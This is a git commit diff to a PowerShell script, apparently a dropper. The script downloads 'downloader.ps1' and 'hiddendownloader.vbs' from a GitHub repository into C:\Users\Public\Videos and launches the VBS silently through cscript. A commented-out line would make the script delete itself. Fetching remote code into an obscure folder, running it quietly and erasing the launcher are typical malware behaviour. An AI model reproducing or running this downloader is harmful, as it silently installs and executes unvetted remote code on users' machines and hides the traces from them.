b46596cc823e236f209fb50cbe31006d7bc41ed8
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-02-04 21:16:02 +0100

    Update downloadanduninstall.ps1

--- downloadanduninstall.ps1
+++ downloadanduninstall.ps1
@@ -1,4 +1,5 @@
 Invoke-WebRequest 'https://github.com/RaupenInspektor/Server/raw/main/downloader.ps1' -OutFile 'C:\Users\Public\Videos\downloader.ps1'
 Invoke-WebRequest 'https://github.com/RaupenInspektor/Server/raw/main/hiddendownloader.vbs' -OutFile 'C:\Users\Public\Videos\hiddendownloader.vbs'
-Invoke-Expression -Command "C:\Users\Public\Videos\hiddendowloader"
+$vbsScriptPath = "C:\Users\Public\Videos\hiddendownloader.vbs"
+Start-Process -FilePath "cscript" -ArgumentList "//NoLogo", "`"$vbsScriptPath`""
 #Remove-Item $PSCommandPath -Force 
